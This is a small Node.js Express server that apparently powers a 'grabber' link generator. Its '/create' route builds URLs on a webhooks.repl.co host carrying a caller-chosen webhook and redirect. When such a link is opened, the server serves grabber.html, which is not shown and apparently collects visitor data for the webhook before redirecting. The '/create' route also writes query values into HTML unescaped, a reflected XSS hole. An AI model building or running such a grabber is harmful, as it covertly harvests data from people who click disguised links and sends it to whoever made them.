const express = require('express');
const app = express();
const path = require('path');

app.get('/', (req, res) => {
  if ("hook" in req.query && "redirect" in req.query) {
    res.sendFile(path.join(__dirname+'/grabber.html'));
  } else {
    res.sendFile(path.join(__dirname+'/index.html'));
  }
});

app.get('/create', (req, res) => {
  if ("hook" in req.query && "redirect" in req.query) {
    var new_URL = `https://xyz.webhooks.repl.co?hook=${ req.query.hook }&redirect=${ req.query.redirect }`
    res.send(`<h1>Your Link has been generated succesfully</h1><br><textarea rows="1" cols="100">${ new_URL }</textarea><br>`)
  }
});

app.listen(3000, () => {
  console.log('server started');
});